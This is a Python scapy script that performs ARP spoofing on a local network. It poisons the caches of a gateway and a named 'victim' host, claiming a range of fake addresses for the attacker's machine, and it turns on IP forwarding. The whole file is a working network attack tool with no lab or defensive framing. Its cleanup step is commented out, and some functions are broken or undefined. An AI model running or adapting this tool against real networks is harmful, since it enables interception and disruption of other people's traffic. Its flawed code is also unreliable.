from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
from datetime import datetime

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src



def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] {} - Sent to {} : {} is-at {}".format(current_time, target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:	
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print("[+]{} - Sent to {} : {} is-at {}".format(current_time, target_ip, host_ip, host_mac))



if __name__ == "__main__":
    ip_start = 150 if len(sys.argv) < 2 else int(sys.argv[1])
    ip_end = 255 if len(sys.argv) < 2 else int(sys.argv[2])
    fake_machines = ["192.168.1."+str(i) for i in range(ip_start, ip_end+1)]
    print("Spoofed IPs are from 192.168.1.{} to 192.168.1.{}".format(ip_start, ip_end))
    
    # gateway ip address
    host = "192.168.1.1" if len(sys.argv) < 4 else sys.argv[3]
    print("Host ip address is {}".format(host))

    #victim ip address
    victim = "192.168.1.104" if len(sys.argv) < 5 else sys.argv[4]
    print("Victim ip address is {}".format(victim))

    # print progress to the screen
    verbose = True
    # enable ip forwarding
    enable_ip_route()
    try:
        while True:
            for fake_machine in fake_machines:    
	            #telling the `target` that we are the `host`
	            # spoof(target, host, verbose) # Not needed because that the IPs are fake

	            # telling the `host` that we are the `fake ip`
	            spoof(host, fake_machine, verbose)
	            # telling the `victim` that we are the `fake ip`
	            spoof(victim, fake_machine, verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        #we don't need this as the fake_machines doesn't exist
        # for fake_machine in fake_machines: 
        #     restore(host, fake_machine)
        #     restore(victim, fake_machine)    
  